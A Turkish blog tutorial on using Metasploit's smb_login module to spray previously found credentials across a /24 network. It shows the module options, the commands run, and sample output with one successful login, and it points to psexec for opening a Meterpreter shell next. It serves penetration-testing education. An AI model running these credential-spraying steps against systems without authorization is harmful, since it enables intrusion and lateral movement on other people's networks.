---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-05-18T13:02:00Z"
excerpt: Yaptığınız taramalarda, bir şekilde kullanıcı adı ve parola bulduğunuzu düşünüyorsunuz.
  Bu kullanıcı adı ve parolanın başka hangi servislerde kullanıldığını denemek isteyebilirsiniz.
  Bu noktada denenebilecek en mantıklı servis SMB olarak adlandırılan ağ üzerinde
  dosya paylaşım servisidir.
guid: https://www.siberoloji.com/?p=1163
id: 1163
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF İçinde SMB Login Kontrolü
url: /tr/msf-icinde-smb-login-kontrolu/
---

  Önceki yazılarımızda “Bilgi Toplama” modüllerinden bir kısmını gördük. IP ve Port tarama ile birlikte servislerin bulunmadı konularını ele aldık. Bir sonraki aşama “Zafiyet Taraması” olarak adlandırılır. Pentest aşamalarından “Bilgi Toplama” işlemleri ne kadar iyi ve sağlıklı yapılırsa, sonraki aşamalarda verim elde etmeniz de o kadar mümkün olacaktır. 
 

  Yaptığınız taramalarda, bir şekilde kullanıcı adı ve parola bulduğunuzu düşünüyorsunuz. Bu kullanıcı adı ve parolanın başka hangi servislerde kullanıldığını denemek isteyebilirsiniz. Bu noktada denenebilecek en mantıklı servis&nbsp;<code>SMB</code>&nbsp;olarak adlandırılan ağ üzerinde dosya paylaşım servisidir. 
 

  Aşağıdaki örnekte,&nbsp;<code>smb_login</code>&nbsp;modülü kullanılmakta ve önceden bulunan bir kullanıcı adı ve parola denenmektedir. Bu tarama türünde, hedef bilgisayar Windows ise dikkatli olmalısınız çünkü başarısız her deneme, sistem yöneticisine ikaz olarak iletilir.&nbsp;<code>smb_login</code>&nbsp;taramanın çok gürültü çıkarttığını bilmelisiniz. 
 

  Yaptığınız&nbsp;<code>smb_login</code>&nbsp;taramasında başarılı bir oturum açma gerçekleşirse, devamında&nbsp;<code>windows/smb/psexec</code>&nbsp;modülünü kullanarak&nbsp;<code>Meterpreter</code>&nbsp;shell açma denenebilir. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> use auxiliary/scanner/smb/smb_login
msf auxiliary<strong>(</strong>smb_login<strong>)</strong> <strong>&gt;</strong> show options

Module options <strong>(</strong>auxiliary/scanner/smb/smb_login<strong>)</strong>:

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   true             no        Try blank passwords <strong>for </strong>all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   PASS_FILE                          no        File containing passwords, one per line
   PRESERVE_DOMAINS  true             no        Respect a username that contains a domain name.
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             445              yes       Set the SMB service port
   SMBDomain         WORKGROUP        no        SMB Domain
   SMBPass                            no        SMB Password
   SMBUser                            no        SMB Username
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works <strong>for </strong>a host
   THREADS           1                yes       The number of concurrent threads
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      true             no        Try the username as the password <strong>for </strong>all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output <strong>for </strong>all attempts

msf auxiliary<strong>(</strong>smb_login<strong>)</strong> <strong>&gt;</strong> set RHOSTS 192.168.1.0/24
RHOSTS <strong>=&gt;</strong> 192.168.1.0/24
msf auxiliary<strong>(</strong>smb_login<strong>)</strong> <strong>&gt;</strong> set SMBUser victim
SMBUser <strong>=&gt;</strong> victim
msf auxiliary<strong>(</strong>smb_login<strong>)</strong> <strong>&gt;</strong> set SMBPass s3cr3t
SMBPass <strong>=&gt;</strong> s3cr3t
msf auxiliary<strong>(</strong>smb_login<strong>)</strong> <strong>&gt;</strong> set THREADS 50
THREADS <strong>=&gt;</strong> 50
msf auxiliary<strong>(</strong>smb_login<strong>)</strong> <strong>&gt;</strong> run

<strong>[</strong><strong>*</strong><strong>]</strong> 192.168.1.100 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
<strong>[</strong><strong>*</strong><strong>]</strong> 192.168.1.111 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
<strong>[</strong><strong>*</strong><strong>]</strong> 192.168.1.114 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
<strong>[</strong><strong>*</strong><strong>]</strong> 192.168.1.125 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
<strong>[</strong><strong>*</strong><strong>]</strong> 192.168.1.116 - SUCCESSFUL LOGIN <strong>(</strong>Unix<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Auxiliary module execution completed

msf auxiliary<strong>(</strong>smb_login<strong>)</strong> <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

  Örnek çıktıda görüldüğü gibi,&nbsp;<code>192.168.1.116</code>&nbsp;IP adresinde başarılı bir oturum açma işlemi gerçekleşmiştir. 
 